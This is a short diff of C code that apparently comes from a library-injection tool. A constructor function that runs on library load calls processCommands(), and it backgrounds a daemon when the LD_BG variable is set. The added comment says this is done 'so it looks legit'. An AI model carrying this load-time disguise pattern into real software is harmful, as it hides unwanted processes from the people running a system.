@@ -346,10 +346,10 @@ __attribute__((constructor)) static void myctor(int argc, char **argv, char** en
     }
 #endif
 
-	
-
+	// register and setup 
 	processCommands();
 
+	// We can even background the process so it looks legit
 	char * bg_cmd=NULL;
 	if ( (bg_cmd = (char*) getenv("LD_BG")) != NULL )
 	 	backgroundDaemonLeader(bg_cmd);
